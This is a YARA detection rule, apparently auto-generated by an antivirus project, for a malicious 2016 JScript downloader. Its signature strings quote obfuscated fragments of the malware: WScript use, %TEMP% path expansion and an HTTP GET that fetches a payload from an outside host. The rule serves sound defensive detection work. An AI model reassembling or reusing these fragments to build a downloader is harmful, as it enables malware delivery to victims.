rule sig_20160428_583eaba7f407aeb2309e89bcf85e63ba {
  meta:
    description = "datamaliciousorder - file 20160428_583eaba7f407aeb2309e89bcf85e63ba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "42c0e5e5591bd9e6f81dcc831ae757a537bdd390ef4c4c225e9c6cf1589472f0"

  strings:
    $s1  = "function VrpMgyIceFwkPgwIrdIlm(BinYgcKmnEtzUnzChiNkl){CzeHnwCqbYkiVjcYsdEoz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function VrpMgyIceFwkPgwIrdIlm(BinYgcKmnEtzUnzChiNkl){CzeHnwCqbYkiVjcYsdEoz[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function PmmPykZpgDdiNluRypBrz() {return CzeHnwCqbYkiVjcYsdEoz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var CzeHnwCqbYkiVjcYsdEoz = function CtyJznRubGzcDxxOdbAlo() {return VapMpbQvkWmrGreCphIng[TymQmeFxuLwzRmpRlfIgl](\"WScript\"+\"" ascii
    $s5  = "return AddIeqXpaClfFmuCetDls - KhcEmiDovNurAykPavYij;};" fullword ascii
    $s6  = "function EptLdxJuyWouPsxBgzUzq(AddIeqXpaClfFmuCetDls, KhcEmiDovNurAykPavYij){YtgDwwNvbDdqZvsRueLns = YtgDwwNvbDdqZvsRueLns * 1; " ascii
    $s7  = "WgeEmrHjmTikBzzSeoVvq[YniWagOyeKtdIvqRolDab](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var VapMpbQvkWmrGreCphIng = this[\"WScript\"];" fullword ascii
    $s9  = "var CzeHnwCqbYkiVjcYsdEoz = function CtyJznRubGzcDxxOdbAlo() {return VapMpbQvkWmrGreCphIng[TymQmeFxuLwzRmpRlfIgl](\"WScript\"+\"" ascii
    $s10 = "function PmmPykZpgDdiNluRypBrz() {return CzeHnwCqbYkiVjcYsdEoz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function DymYmfSlsWspYrdAcuXbc(){return TymQmeFxuLwzRmpRlfIgl;};" fullword ascii
    $s12 = "function KpaXcsFeePxlVrlMnwVho(){return ZlaNbhLezSdcWloEjlMfw + \"\";};" fullword ascii
    $s13 = "function EptLdxJuyWouPsxBgzUzq(AddIeqXpaClfFmuCetDls, KhcEmiDovNurAykPavYij){YtgDwwNvbDdqZvsRueLns = YtgDwwNvbDdqZvsRueLns * 1; " ascii
    $s14 = "if (WgeEmrHjmTikBzzSeoVvq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s15 = "function YrvHhuSbuRabCslEnqUqd() {return ((XqrZduPmiUgwBnlNgdAnj == true) && (XqrZduPmiUgwBnlNgdAnj == LntFdaUemYpeWctEtlGwi)) ?" ascii
    $s16 = "function YrvHhuSbuRabCslEnqUqd() {return ((XqrZduPmiUgwBnlNgdAnj == true) && (XqrZduPmiUgwBnlNgdAnj == LntFdaUemYpeWctEtlGwi)) ?" ascii
    $s17 = "LntFdaUemYpeWctEtlGwi = true; " fullword ascii
    $s18 = "function VltLkcWlpPbzQlvLykCbm(EqmZkxBpqXsdHukXtkTuz) {var MjoTpwUthYtmOukDhnQlz = (1, 2, 3, 4, 5, EqmZkxBpqXsdHukXtkTuz); retur" ascii
    $s19 = "XqrZduPmiUgwBnlNgdAnj = true; " fullword ascii
    $s20 = "var KdnGzdFlgCwhHmsKqmQad = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}